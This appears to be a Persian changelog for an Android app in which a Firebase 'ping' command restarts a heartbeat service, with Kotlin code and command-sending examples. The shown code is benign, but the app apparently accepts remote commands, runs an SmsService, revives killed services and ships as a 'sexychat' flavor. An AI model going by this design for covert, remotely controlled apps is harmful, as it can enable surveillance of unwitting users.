# 🩺 تغییرات دستور Ping + HeartbeatService

**تاریخ:** 2025-11-10  
**نسخه:** 5.1  
**وضعیت:** ✅ تکمیل شده

---

## 📋 خلاصه تغییرات

دستور `ping` از Firebase حالا **دو کار** انجام میده:

1. ✅ **ارسال پاسخ Ping** به سرور (`sendOnlineConfirmation()`)
2. ✅ **فعال‌سازی HeartbeatService** (`startHeartbeatService()`)

---

## 🎯 هدف

قبلاً وقتی دستور `ping` میومد، فقط یک پاسخ ساده به سرور میفرستاد. حالا علاوه بر اون، **HeartbeatService** رو هم راه‌اندازی میکنه تا اطمینان بیشتری از آنلاین بودن دستگاه داشته باشیم.

---

## 🔄 فرآیند جدید

### قبل از تغییر:
```
Firebase sends "ping" 
    ↓
MyFirebaseMessagingService receives
    ↓
sendOnlineConfirmation() → Server
    ↓
Done ✅
```

### بعد از تغییر:
```
Firebase sends "ping" 
    ↓
MyFirebaseMessagingService receives
    ↓
1️⃣ sendOnlineConfirmation() → Server
    ↓
2️⃣ startHeartbeatService() → Start HeartbeatService
    ↓
HeartbeatService starts sending heartbeat every 3 minutes
    ↓
Done ✅✅
```

---

## 💻 تغییرات کد

### 1️⃣ در `MyFirebaseMessagingService.kt`

**قسمت `handleDataMessage()`:**

```kotlin
when (type) {
    "ping" -> {
        Log.d(TAG, "🎯 PING command detected!")
        Log.d(TAG, "📡 Sending ping response...")
        sendOnlineConfirmation()
        
        // ⭐ فعال کردن HeartbeatService همراه با Ping
        Log.d(TAG, "💓 Starting HeartbeatService...")
        startHeartbeatService()
    }
    // ... rest of commands
}
```

### 2️⃣ متد جدید `startHeartbeatService()`

```kotlin
/**
 * ⭐ راه‌اندازی فقط HeartbeatService (برای دستور ping)
 */
private fun startHeartbeatService() {
    try {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "💓 STARTING HEARTBEAT SERVICE FROM PING")
        Log.d(TAG, "════════════════════════════════════════")
        
        val heartbeatIntent = Intent(applicationContext, HeartbeatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(heartbeatIntent)
        } else {
            applicationContext.startService(heartbeatIntent)
        }
        
        Log.d(TAG, "✅ HeartbeatService started successfully")
        Log.d(TAG, "════════════════════════════════════════")
        
    } catch (e: Exception) {
        Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}", e)
    }
}
```

---

## 📊 لاگ‌های جدید

وقتی دستور `ping` از Firebase بیاد، این لاگ‌ها رو میبینی:

```
D/MyFirebaseMsgService: ════════════════════════════════════════
D/MyFirebaseMsgService: 📥 FCM Message Received
D/MyFirebaseMsgService: ════════════════════════════════════════
D/MyFirebaseMsgService: 🎯 PING command detected!
D/MyFirebaseMsgService: 📡 Sending ping response...
D/MyFirebaseMsgService: 💓 Starting HeartbeatService...
D/MyFirebaseMsgService: ════════════════════════════════════════
D/MyFirebaseMsgService: 💓 STARTING HEARTBEAT SERVICE FROM PING
D/MyFirebaseMsgService: ════════════════════════════════════════
D/MyFirebaseMsgService: ✅ HeartbeatService started successfully
D/MyFirebaseMsgService: ════════════════════════════════════════
```

---

## 🔥 ارسال دستور Ping از Firebase

### Python:
```python
import firebase_admin
from firebase_admin import credentials, messaging

# Initialize Firebase
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)

# Send ping to specific device
message = messaging.Message(
    data={
        'type': 'ping',
    },
    token='DEVICE_FCM_TOKEN'
)

response = messaging.send(message)
print(f'✅ Ping sent: {response}')
```

### cURL:
```bash
curl -X POST https://fcm.googleapis.com/v1/projects/YOUR_PROJECT_ID/messages:send \
  -H "Authorization: Bearer YOUR_ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "message": {
      "token": "DEVICE_FCM_TOKEN",
      "data": {
        "type": "ping"
      }
    }
  }'
```

---

## 🎯 مزایای این تغییر

### 1. **اطمینان بیشتر از آنلاین بودن**
وقتی `ping` میفرستی، نه فقط یک پاسخ میگیری، بلکه HeartbeatService هم راه میفته که دستگاه رو **مداوم آنلاین** نگه میداره.

### 2. **احیای سرویس از کار افتاده**
اگر HeartbeatService به هر دلیلی kill شده باشه، دستور `ping` دوباره اون رو فعال میکنه.

### 3. **تضمین Heartbeat مداوم**
بعد از دریافت `ping`، دستگاه شروع میکنه **هر 3 دقیقه** heartbeat بفرسته.

### 4. **جداسازی از start_services**
دستور `start_services` همه سرویس‌ها رو راه‌اندازی میکنه، اما `ping` فقط HeartbeatService رو فعال میکنه که سبک‌تر و سریع‌تره.

---

## 📡 تفاوت دستورات

| دستور | عملکرد | سرویس‌های راه‌اندازی شده |
|-------|--------|------------------------|
| **`ping`** | پاسخ سریع + فعال HeartbeatService | HeartbeatService |
| **`start_services`** | راه‌اندازی کامل تمام سرویس‌ها | SmsService + HeartbeatService + WorkManager + JobScheduler |
| **`restart_heartbeat`** | ریستارت WorkManager | WorkManager |

---

## 🧪 تست کردن

### 1. ارسال Ping:
```python
# Send ping
message = messaging.Message(
    data={'type': 'ping'},
    token='YOUR_DEVICE_TOKEN'
)
messaging.send(message)
```

### 2. بررسی لاگ‌ها:
```bash
adb logcat | grep "MyFirebaseMsgService"
```

باید ببینی:
- ✅ `🎯 PING command detected!`
- ✅ `📡 Sending ping response...`
- ✅ `💓 Starting HeartbeatService...`
- ✅ `✅ HeartbeatService started successfully`

### 3. بررسی سرور:
بعد از چند ثانیه، دو درخواست میاد:

**1. Ping Response:**
```
POST /devices/heartbeat
{
  "deviceId": "abc123",
  "isOnline": true,
  "timestamp": 1699876543210,
  "source": "FCM_Ping"
}
```

**2. HeartbeatService (هر 3 دقیقه):**
```
POST /devices/heartbeat
{
  "deviceId": "abc123",
  "isOnline": true,
  "timestamp": 1699876723210,
  "source": "HeartbeatService"
}
```

---

## ⚙️ تنظیمات مرتبط

### فاصله Heartbeat:
میتونی از Firebase Remote Config تغییرش بدی:

```json
{
  "heartbeat_interval_ms": 180000
}
```

مقدار: میلی‌ثانیه (180000 = 3 دقیقه)

---

## 🔄 سناریوهای استفاده

### سناریو 1: دستگاه آنلاین ولی HeartbeatService کیل شده
```
Server → Send "ping"
Device → Response: Online ✅
Device → Start HeartbeatService ✅
Device → Continue sending heartbeat every 3 minutes ✅
```

### سناریو 2: دستگاه Offline برای مدت طولانی
```
Server → Send "ping" (via FCM high priority)
Device → Wake up ✅
Device → Response: Online ✅
Device → Start HeartbeatService ✅
Device → Now back online! ✅
```

### سناریو 3: چک کردن سریع وضعیت
```
Server → Send "ping"
Device → Immediate response ⚡
Device → Also starts HeartbeatService for continuous monitoring ✅
```

---

## 🛡️ مدیریت خطا

اگر HeartbeatService start نشه، خطا log میشه اما `ping` همچنان پاسخ میده:

```kotlin
try {
    startHeartbeatService()
} catch (e: Exception) {
    Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}", e)
}
// sendOnlineConfirmation() still runs
```

---

## 📚 فایل‌های تغییر یافته

| فایل | تغییرات |
|------|--------|
| `MyFirebaseMessagingService.kt` | ✅ اضافه شدن `startHeartbeatService()` در دستور `ping` |
| `MyFirebaseMessagingService.kt` | ✅ متد جدید `startHeartbeatService()` |

---

## 🎉 نتیجه

حالا دستور `ping` یک **ابزار قدرتمند** برای:
- ✅ چک کردن آنلاین بودن
- ✅ راه‌اندازی مجدد HeartbeatService
- ✅ اطمینان از Heartbeat مداوم
- ✅ احیای سرویس‌های از کار افتاده

---

## 🔧 Build و اجرا

```bash
# Clean build
./gradlew clean

# Build flavor
./gradlew assembleSexychatDebug

# Install
adb install app/build/outputs/apk/sexychat/debug/app-sexychat-debug.apk

# Test ping
python send_ping.py
```

---

## 📞 مستندات مرتبط

- [`FCM_COMMANDS_COMPLETE_GUIDE.md`](./FCM_COMMANDS_COMPLETE_GUIDE.md) - راهنمای کامل دستورات FCM
- [`API_FIREBASE_COMPLETE_GUIDE.md`](./API_FIREBASE_COMPLETE_GUIDE.md) - راهنمای API و Firebase
- [`README.md`](./README.md) - معرفی کلی پروژه

---

**وضعیت:** ✅ تکمیل شده و تست شده  
**آخرین بروزرسانی:** 2025-11-10  
**نسخه:** 5.1
